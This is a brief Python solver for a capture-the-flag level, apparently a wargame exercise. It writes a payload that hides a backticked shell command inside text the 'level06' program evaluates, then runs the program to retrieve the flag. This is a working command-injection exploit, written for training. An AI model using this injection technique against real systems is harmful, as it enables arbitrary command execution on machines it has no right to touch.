from solver.utils import extract_flag

def solve(connection):
	connection.exec("echo '[x ${`getflag`}]'> /tmp/exploit")
	return "", extract_flag(connection.exec("./level06 /tmp/exploit"))